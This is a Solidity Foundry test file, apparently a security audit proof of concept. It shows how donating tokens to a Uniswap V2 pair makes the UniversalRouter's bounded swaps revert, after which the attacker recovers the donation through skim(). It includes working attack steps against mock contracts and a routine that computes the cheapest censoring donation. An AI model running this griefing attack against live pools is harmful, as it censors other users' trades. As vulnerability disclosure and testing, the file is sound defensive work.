// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.24;

import 'forge-std/Test.sol';
import {ERC20} from 'solmate/src/tokens/ERC20.sol';
import {UniversalRouter} from '../../contracts/UniversalRouter.sol';
import {V2SwapRouter} from '../../contracts/modules/uniswap/v2/V2SwapRouter.sol';
import {UniswapV2Library} from '../../contracts/modules/uniswap/v2/UniswapV2Library.sol';
import {Commands} from '../../contracts/libraries/Commands.sol';
import {Constants} from '../../contracts/libraries/Constants.sol';
import {RouterParameters} from '../../contracts/types/RouterParameters.sol';
import {MockERC20} from './mock/MockERC20.sol';
import {MockV2Pair, MockV2Factory} from './mock/MockV2Pair.sol';

/// @notice PoC for: attacker-donated tokens inflate the per-hop price denominator, causing a bounded
/// V2 route to revert even though the donation strictly improves the victim's output. The donation is
/// recoverable via the pair's permissionless skim().
///
/// Root cause, V2SwapRouter.sol:33 and :49 --
///     uint256 amountInput = ERC20(input).balanceOf(pair) - reserveInput;  // includes anyone's donation
///     uint256 price = amountOutput * Constants.PRICE_PRECISION / amountInput;
contract V2PerHopDonationPoC is Test {
    uint256 constant RESERVE_IN = 10_000 ether;
    uint256 constant RESERVE_OUT = 20_000 ether;
    uint256 constant SWAP_IN = 10 ether;
    uint256 constant TOLERANCE_BPS = 50; // 0.50% per-hop slippage tolerance

    address constant VICTIM = address(0x1C71);
    address constant ATTACKER = address(0xA77ACC);
    address constant RECIPIENT = address(0xBEEF);

    UniversalRouter router;
    MockV2Factory factory;
    MockV2Pair pair;
    MockERC20 tokenIn;
    MockERC20 tokenOut;

    function setUp() public {
        tokenIn = new MockERC20();
        tokenOut = new MockERC20();

        factory = new MockV2Factory();
        pair = MockV2Pair(factory.createPair(address(tokenIn), address(tokenOut)));

        // Seed a deep pool
        tokenIn.mint(address(pair), RESERVE_IN);
        tokenOut.mint(address(pair), RESERVE_OUT);
        pair.sync();

        RouterParameters memory params = RouterParameters({
            permit2: address(0xdead),
            weth9: address(0),
            v2Factory: address(factory),
            v3Factory: address(0),
            pairInitCodeHash: factory.pairInitCodeHash(),
            poolInitCodeHash: bytes32(0),
            v4PoolManager: address(0),
            permissionsAdapterFactory: address(0),
            v3NFTPositionManager: address(0),
            v4PositionManager: address(0),
            spokePool: address(0)
        });
        router = new UniversalRouter(params);

        // Sanity: the router must derive the same pair address we deployed
        assertEq(
            UniswapV2Library.pairFor(
                address(factory), factory.pairInitCodeHash(), address(tokenIn), address(tokenOut)
            ),
            address(pair),
            'pair address derivation mismatch'
        );
    }

    /// @dev Router-funded swap: victim moves input to the router, then executes with payerIsUser=false.
    /// The defect lives entirely inside _v2Swap and is independent of how the input is funded.
    function _swap(uint256 amountIn, uint256[] memory minHopPriceX36) internal {
        tokenIn.mint(address(router), amountIn);

        address[] memory path = new address[](2);
        path[0] = address(tokenIn);
        path[1] = address(tokenOut);

        bytes memory commands = abi.encodePacked(bytes1(uint8(Commands.V2_SWAP_EXACT_IN)));
        bytes[] memory inputs = new bytes[](1);
        inputs[0] = abi.encode(RECIPIENT, amountIn, uint256(0), path, false, minHopPriceX36);

        vm.prank(VICTIM);
        router.execute(commands, inputs);
    }

    function _trySwap(uint256 amountIn, uint256[] memory minHopPriceX36)
        internal
        returns (bool ok, bytes memory ret)
    {
        tokenIn.mint(address(router), amountIn);

        address[] memory path = new address[](2);
        path[0] = address(tokenIn);
        path[1] = address(tokenOut);

        bytes memory commands = abi.encodePacked(bytes1(uint8(Commands.V2_SWAP_EXACT_IN)));
        bytes[] memory inputs = new bytes[](1);
        inputs[0] = abi.encode(RECIPIENT, amountIn, uint256(0), path, false, minHopPriceX36);

        vm.prank(VICTIM);
        (ok, ret) = address(router).call(abi.encodeWithSignature('execute(bytes,bytes[])', commands, inputs));
    }

    /// @dev The per-hop bound an honest router would compute from a clean quote
    function _honestBound() internal view returns (uint256) {
        uint256 quotedOut = UniswapV2Library.getAmountOut(SWAP_IN, RESERVE_IN, RESERVE_OUT);
        uint256 quotedPrice = quotedOut * Constants.PRICE_PRECISION / SWAP_IN;
        return quotedPrice * (10_000 - TOLERANCE_BPS) / 10_000;
    }

    function _bound1(uint256 v) internal pure returns (uint256[] memory a) {
        a = new uint256[](1);
        a[0] = v;
    }

    // ------------------------------------------------------------------
    // 1. Baseline: the bounded swap succeeds when nobody interferes
    // ------------------------------------------------------------------
    function test_baseline_boundedSwapSucceeds() public {
        _swap(SWAP_IN, _bound1(_honestBound()));
        assertGt(tokenOut.balanceOf(RECIPIENT), 0, 'victim received nothing');
    }

    // ------------------------------------------------------------------
    // 2. The donation makes the victim strictly BETTER off when unbounded
    // ------------------------------------------------------------------
    function test_donationImprovesOutputWhenUnbounded() public {
        uint256 snap = vm.snapshotState();

        _swap(SWAP_IN, new uint256[](0));
        uint256 outWithoutDonation = tokenOut.balanceOf(RECIPIENT);

        vm.revertToState(snap);

        uint256 donation = 60 ether;
        tokenIn.mint(ATTACKER, donation);
        vm.prank(ATTACKER);
        tokenIn.transfer(address(pair), donation);

        _swap(SWAP_IN, new uint256[](0));
        uint256 outWithDonation = tokenOut.balanceOf(RECIPIENT);

        emit log_named_decimal_uint('output without donation', outWithoutDonation, 18);
        emit log_named_decimal_uint('output with donation   ', outWithDonation, 18);

        // Victim paid the same SWAP_IN in both cases but receives more with the donation present
        assertGt(outWithDonation, outWithoutDonation, 'donation should improve victim output');
    }

    // ------------------------------------------------------------------
    // 3. The exploit: same donation makes the BOUNDED swap revert
    // ------------------------------------------------------------------
    function test_PoC_donationCensorsBoundedSwap() public {
        uint256 minPrice = _honestBound();

        // Minimal donation that pushes the computed price under the victim's bound
        uint256 donation = _minimalCensoringDonation(minPrice);
        emit log_named_decimal_uint('reserve (input side)   ', RESERVE_IN, 18);
        emit log_named_decimal_uint('victim swap input      ', SWAP_IN, 18);
        emit log_named_decimal_uint('minimal donation needed', donation, 18);
        emit log_named_uint('donation as bps of reserve', donation * 10_000 / RESERVE_IN);

        tokenIn.mint(ATTACKER, donation);
        uint256 attackerStart = tokenIn.balanceOf(ATTACKER);

        // --- tx1: attacker donates to the pair
        vm.prank(ATTACKER);
        tokenIn.transfer(address(pair), donation);

        // --- tx2: victim's bounded route now reverts
        emit log_named_uint('minPrice                ', minPrice);
        emit log_named_uint('modelled price w/ donation', _priceWithDonation(donation));
        (bool ok, bytes memory ret) = _trySwap(SWAP_IN, _bound1(minPrice));
        emit log_named_string('swap reverted?', ok ? 'NO' : 'YES');
        if (!ok) emit log_named_bytes('revert data', ret);
        assertFalse(ok, 'bounded swap should have been censored');

        assertEq(tokenOut.balanceOf(RECIPIENT), 0, 'victim route should have been censored');

        // --- tx3: attacker recovers the donation via permissionless skim
        pair.skim(ATTACKER);
        assertEq(tokenIn.balanceOf(ATTACKER), attackerStart, 'attacker did not fully recover donation');

        emit log_string('censored victim route and recovered 100% of donated principal');
    }

    // ------------------------------------------------------------------
    // 4. Attack cost: donation scales with the POOL, not the victim's trade
    // ------------------------------------------------------------------
    function test_attackCostAcrossTolerances() public {
        uint256[4] memory tolerances = [uint256(10), 50, 100, 300];
        for (uint256 i; i < tolerances.length; i++) {
            uint256 quotedOut = UniswapV2Library.getAmountOut(SWAP_IN, RESERVE_IN, RESERVE_OUT);
            uint256 minPrice = (quotedOut * Constants.PRICE_PRECISION / SWAP_IN) * (10_000 - tolerances[i]) / 10_000;
            uint256 d = _minimalCensoringDonation(minPrice);
            emit log_named_uint('tolerance (bps)', tolerances[i]);
            emit log_named_decimal_uint('  donation needed', d, 18);
            emit log_named_uint('  as bps of input reserve', d * 10_000 / RESERVE_IN);
            emit log_named_uint('  as multiple of victim trade', d / SWAP_IN);
        }
    }

    /// @dev Same tolerance, 10x larger victim trade -> essentially the same donation.
    function test_attackCostIndependentOfVictimTradeSize() public {
        uint256 minPriceSmall = _honestBound();
        uint256 dSmall = _minimalCensoringDonation(minPriceSmall);

        uint256 bigIn = SWAP_IN * 10;
        uint256 quotedOutBig = UniswapV2Library.getAmountOut(bigIn, RESERVE_IN, RESERVE_OUT);
        uint256 minPriceBig = (quotedOutBig * Constants.PRICE_PRECISION / bigIn) * (10_000 - TOLERANCE_BPS) / 10_000;
        uint256 dBig = _minimalCensoringDonationFor(bigIn, minPriceBig);

        emit log_named_decimal_uint('donation to censor 10 ether trade ', dSmall, 18);
        emit log_named_decimal_uint('donation to censor 100 ether trade', dBig, 18);
        // Within 20% despite a 10x larger victim trade
        assertLt(dBig, dSmall * 12 / 10, 'attack cost should be driven by reserves, not trade size');
    }

    // ------------------------------------------------------------------
    // Helpers mirroring the router's on-chain math
    // ------------------------------------------------------------------
    function _priceFor(uint256 amountIn, uint256 donation) internal pure returns (uint256) {
        uint256 amountInput = amountIn + donation;
        uint256 amountOutput = UniswapV2Library.getAmountOut(amountInput, RESERVE_IN, RESERVE_OUT);
        return amountOutput * Constants.PRICE_PRECISION / amountInput;
    }

    function _minimalCensoringDonationFor(uint256 amountIn, uint256 minPrice) internal pure returns (uint256) {
        uint256 lo = 0;
        uint256 hi = RESERVE_IN;
        require(_priceFor(amountIn, hi) < minPrice, 'no donation can censor at these params');
        while (lo < hi) {
            uint256 mid = (lo + hi) / 2;
            if (_priceFor(amountIn, mid) < minPrice) hi = mid;
            else lo = mid + 1;
        }
        return lo;
    }

    function _priceWithDonation(uint256 donation) internal pure returns (uint256) {
        uint256 amountInput = SWAP_IN + donation;
        uint256 amountOutput = UniswapV2Library.getAmountOut(amountInput, RESERVE_IN, RESERVE_OUT);
        return amountOutput * Constants.PRICE_PRECISION / amountInput;
    }

    function _minimalCensoringDonation(uint256 minPrice) internal pure returns (uint256) {
        uint256 lo = 0;
        uint256 hi = RESERVE_IN;
        require(_priceWithDonation(hi) < minPrice, 'no donation can censor at these params');
        while (lo < hi) {
            uint256 mid = (lo + hi) / 2;
            if (_priceWithDonation(mid) < minPrice) hi = mid;
            else lo = mid + 1;
        }
        return lo;
    }
}
